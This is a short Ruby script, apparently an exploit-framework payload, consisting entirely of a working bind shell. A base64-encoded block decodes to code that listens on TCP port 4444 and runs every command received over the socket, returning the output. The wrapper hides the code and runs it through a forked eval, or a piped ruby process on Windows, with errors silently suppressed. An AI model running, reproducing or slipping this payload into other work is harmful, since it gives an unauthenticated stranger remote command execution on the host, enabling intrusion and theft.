code = %(cmVxdWlyZSAnc29ja2V0JztzPVRDUFNlcnZlci5uZXcoIjo6Iiw0NDQ0KTtjPXMuYWNjZXB0O3MuY2xvc2U7JHN0ZGluLnJlb3BlbihjKTskc3Rkb3V0LnJlb3BlbihjKTskc3RkZXJyLnJlb3BlbihjKTskc3RkaW4uZWFjaF9saW5le3xsfGw9bC5zdHJpcDtuZXh0IGlmIGwubGVuZ3RoPT0wOyhJTy5wb3BlbihsLCJyYiIpe3xmZHwgZmQuZWFjaF9saW5lIHt8b3wgYy5wdXRzKG8uc3RyaXApIH19KSByZXNjdWUgbmlsIH0=).unpack(%(m0)).first
if RUBY_PLATFORM =~ /mswin|mingw|win32/
inp = IO.popen(%(ruby), %(wb)) rescue nil
if inp
inp.write(code)
inp.close
end
else
if ! Process.fork()
eval(code) rescue nil
end
end